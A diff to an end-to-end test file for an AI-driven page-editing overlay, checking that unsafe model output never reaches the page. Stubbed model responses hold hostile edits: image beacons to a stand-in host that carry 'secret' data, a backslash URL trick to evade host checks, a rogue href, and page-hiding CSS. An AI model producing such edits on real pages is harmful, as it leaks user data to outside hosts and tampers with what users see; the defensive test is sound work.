@@ -37,6 +37,7 @@ function previewFor(text) {
   if (t.includes("outside")) return { summary: "x", ops: [{ op: "setText", target: "pp999", text: "escaped" }] };
   if (t.includes("style attack")) return { summary: "x", ops: [{ op: "setText", target: "pp10", text: "body{display:none}" }] };
   if (t.includes("image beacon")) return { summary: "x", ops: [{ op: "insert", parent: "pp0", index: 0, node: { tag: "img", attrs: [{ name: "src", value: "https://evil.example/x.png?d=secret" }, { name: "alt", value: "" }] } }] };
+  if (t.includes("backslash beacon")) return { summary: "x", ops: [{ op: "insert", parent: "pp0", index: 0, node: { tag: "img", attrs: [{ name: "src", value: "/\\evil.example/x.png" }, { name: "alt", value: "" }] } }] };
   if (t.includes("href on heading")) return { summary: "x", ops: [{ op: "setAttr", target: "pp2", name: "href", value: "https://evil.example" }] };
   if (t.includes("position")) return { summary: "x", ops: [{ op: "setStyle", target: "pp0", styles: { position: "fixed", inset: "0" } }] };
   return { summary: "Nothing to change.", ops: [] };
@@ -174,7 +175,7 @@ test("select, preview, follow up, undo, reset (static fixture)", async () => {
 test("unsafe model output never reaches the page", async () => {
   // Each one is stopped by the server's validator or, failing that, by the overlay's own checks.
   const layers = {};
-  for (const text of ["evil", "handler", "outside", "position", "style attack", "image beacon", "href on heading"]) {
+  for (const text of ["evil", "handler", "outside", "position", "style attack", "image beacon", "backslash beacon", "href on heading"]) {
     const before = await page.$eval("main", (m) => m.innerHTML);
     await panel().locator("textarea").fill(text);
     await btn("Send").click();
@@ -296,6 +297,23 @@ test("page scripts can't reach the panel, its token, or the API", async () => {
     return { doc, tokenInPage: html.includes("e2e-token-0123456789"), api };
   });
   assert.deepEqual(r, { doc: "blocked", tokenInPage: false, api: "blocked" });
+});
+
+test("if the page removes a preview, the original element comes back", async () => {
+  await page.reload();
+  await waitStatus("Click Select again");
+  await btn("Select again").click();
+  await waitStatus("Click a section");
+  await pickAt(".features");
+  await selected("section.features");
+  await send("make it two columns", "Review the proposal");
+  await applyPreview();
+  assert.equal(await page.locator("section.features").count(), 2, "original (hidden) plus preview clone");
+  // Remove the visible clone the way a framework re-render might.
+  await page.evaluate(() => [...document.querySelectorAll("section.features")].find((s) => s.style.display !== "none").remove());
+  await waitStatus("replaced the selected section");
+  assert.equal(await page.locator("section.features").count(), 1);
+  assert.ok(await page.locator("section.features").isVisible(), "original is shown again");
 });
 
 test("Close restores the page", async () => {
